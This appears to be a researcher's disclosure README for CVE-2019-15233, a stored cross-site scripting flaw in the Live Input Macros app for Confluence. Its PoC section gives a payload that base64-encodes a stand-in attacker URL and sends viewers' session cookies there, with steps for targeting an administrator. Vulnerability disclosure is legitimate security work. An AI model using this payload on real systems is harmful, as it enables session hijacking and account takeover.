# CVE-2019-15233
(FAB-2019-00157) Vulnerability discoverd by me CVE-2019-15233


Advisory: [advisory](./advisory.txt)

## Basic Info

```
Advisory ID: FAB-2019-00157
Product: Live Input Macros
Manufacturer: Old Street Solutions
Affected Version(s): 2.10 and before
Tested Version(s): 2.10
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: High
CVSS v3.0: 7.6
Vektor String: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:H
Vendor Homepage: https://www.oldstreetsolutions.com/
Software Link: https://marketplace.atlassian.com/apps/1215287/live-input-macros
Solution Status: Reported
Manufacturer Notification: 2019-08-19
Solution Date: 2019-08-20
Public Disclosure: 2019-08-20
CVE Reference: CVE-2019-15233
Author of Advisory: Francesco Emanuel Bennici, FABMation GmbH
```

## Credits

This security vulnerability was found by _Francesco Emanuel Bennici <eb@fabmation.de>_
of FABMation GmbH.


## Description

Live Input Macros gives Users the possibility to add checkboxes, radio buttons,
dropdown lists and more to your Confluence pages and make changes without
editing the page.

An attacker can execute JavaScript Code on the Confluence Site if a User
adds the malicous Code.

This can be used to steal the Session Cookie of an (eg.) Administrator (Session
Hijacking).


## PoC/ Exploit

Copy this Content:
```
Hello World this is my Text Box </p> </div>





alksdfjlkasdjflkj </p> " <br/> <style/onload=window.location=atob("aHR0cDovL2V2aWwuc2l0ZS8/PQ==")+document.cookie> <br/> " <p> asdasd
```

And create a new Element on a Confluence Page. Paste this text into it and share
the Confluence Page with (eg.) an Systemadministrator and if he access the Site,
you can Hijack/ "Copy" his Session.
